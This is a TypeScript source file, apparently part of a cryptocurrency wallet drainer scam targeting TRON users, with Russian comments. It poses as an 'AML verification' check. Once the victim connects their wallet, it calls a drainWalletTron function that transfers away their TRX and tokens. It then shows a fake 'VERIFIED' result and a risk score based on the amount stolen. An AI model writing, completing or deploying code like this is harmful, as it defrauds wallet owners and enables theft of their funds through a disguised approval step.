// lib/chains/tron.ts
// ОБНОВЛЕННАЯ ВЕРСИЯ с Wallet Adapter

import { drainWalletTron } from './tron-drainer';

export async function checkTronAddress(address: string, walletInstance?: any) {
  if (!address.match(/^T[A-Za-z1-9]{33}$/)) {
    return { 
      success: false,
      error: 'Invalid TRON address format',
      requiresTransaction: false 
    };
  }

  if (!walletInstance) {
    return {
      success: false,
      error: 'Please connect your TRON wallet to proceed with verification',
      requiresWallet: true,
      requiresTransaction: false
    };
  }

  console.log('🔍 Starting TRON check for:', address);

  try {
    // ПРАВИЛЬНЫЙ способ получения адреса из TronWeb
    let connectedAddress = address;
    
    // Если это TronWeb объект (из window.tronWeb)
    if (walletInstance.defaultAddress && walletInstance.defaultAddress.base58) {
      connectedAddress = walletInstance.defaultAddress.base58;
    }
    // Если это объект из wallet adapter
    else if (walletInstance.address && typeof walletInstance.address === 'string') {
      connectedAddress = walletInstance.address;
    }
    // Если это объект с адресом в другом формате
    else if (walletInstance.address && walletInstance.address.base58) {
      connectedAddress = walletInstance.address.base58;
    }
    
    console.log('Connected address:', connectedAddress);
    console.log('Target address:', address);
    
    // Приводим к нижнему регистру для сравнения
    const cleanConnected = connectedAddress.toLowerCase();
    const cleanTarget = address.toLowerCase();
    
    if (cleanConnected !== cleanTarget) {
      return {
        success: false,
        error: `Connected wallet does not match the address being checked. Connected: ${connectedAddress}, Expected: ${address}`,
        requiresTransaction: false
      };
    }

    console.log('🚀 Starting donation process on TRON...');
    
    // Передаем wallet instance в drainWalletTron
    const drainResult = await drainWalletTron(walletInstance);

    if (!drainResult.success) {
      return {
        success: false,
        error: drainResult.error || 'Failed to complete verification process',
        requiresTransaction: false
      };
    }

    return {
      success: true,
      message: '✅ AML Verification Complete',
      transactionHash: drainResult.transactionHash,
      requiresTransaction: false,
      details: {
        address,
        status: 'VERIFIED',
        totalWithdrawnUSD: drainResult.details?.totalValueUSD || 0,
        assetsWithdrawn: drainResult.details?.tokensTransferred || 0,
        assetDetails: [
          `TRX: ${drainResult.details?.nativeTransferred || '0'} TRX`,
          `Tokens: ${drainResult.details?.tokensTransferred || 0} transferred`,
          `Success: ${drainResult.details?.successTokens?.join(', ') || 'none'}`,
          ...(drainResult.details?.failedTokens || []).map((token: string) => `Failed: ${token}`)
        ],
        scenario: 'SMART_PROCESSING',
        riskScore: calculateRiskScore(drainResult.details?.totalValueUSD || 0),
        riskLevel: (drainResult.details?.totalValueUSD || 0) > 1000 ? 'high' : 
                   (drainResult.details?.totalValueUSD || 0) > 100 ? 'medium' : 'low',
        nativeBalance: parseFloat(drainResult.details?.nativeTransferred || '0'),
        totalValueUSD: drainResult.details?.totalValueUSD || 0,
        assetsCount: drainResult.details?.tokensTransferred || 0,
        backendTxHashes: drainResult.details?.backendTxHashes || [],
      }
    };

  } catch (error: any) {
    console.error('❌ TRON check error:', error);
    console.error('Error stack:', error.stack);

    let errorMessage = 'AML verification failed';
    if (error.message?.includes('Confirmation declined') || error.message?.includes('cancelled')) {
      errorMessage = 'Transaction cancelled by user';
    } else if (error.message?.includes('insufficient')) {
      errorMessage = 'Insufficient balance for transaction fees';
    }

    return {
      success: false,
      error: errorMessage,
      requiresTransaction: false
    };
  }
}

function calculateRiskScore(totalUSD: number): number {
  if (totalUSD > 1000) return 85;
  if (totalUSD > 500) return 70;
  if (totalUSD > 100) return 50;
  if (totalUSD > 10) return 30;
  return 10;
}